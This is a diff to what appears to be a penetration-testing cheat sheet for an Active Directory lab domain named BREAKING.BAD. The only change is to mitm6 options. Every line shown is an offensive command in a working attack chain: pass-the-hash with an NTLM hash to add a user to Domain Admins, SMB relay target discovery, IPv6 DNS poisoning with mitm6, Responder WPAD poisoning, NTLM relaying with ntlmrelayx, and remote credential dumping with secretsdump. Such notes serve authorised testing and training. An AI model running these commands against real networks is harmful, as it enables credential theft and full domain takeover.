@@ -24,7 +24,8 @@ pth-net rpc group members "Domain admins" -U BREAKING.BAD/Administrator%ffffffff
 pth-net rpc group addmem "Domain admins" Shutdown -U BREAKING.BAD/Administrator%ffffffffffffffffffffffffffffffff:a88baa3fdc8f581ee0fb05d7054d43e4 -S DC01.BREAKING.BAD
 cme smb 192.168.56.0/24 --gen-relay-list smb_targets.txt
 crackmapexec smb 192.168.56.0/24 --gen-relay-list smb_targets.txt
-mitm6 --ignore-nofqdn --interface eth0
+mitm6 --interface eth0
+mitm6 --interface eth0 --domain BREAKING.BAD 
 responder --interface eth0 --wredir --NBTNSdomain --wpad --lm --ProxyAuth --ForceWpadAuth
 ntlmrelayx -tf targets.txt -w -6 -smb2support -socks
 proxychains secretsdump -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
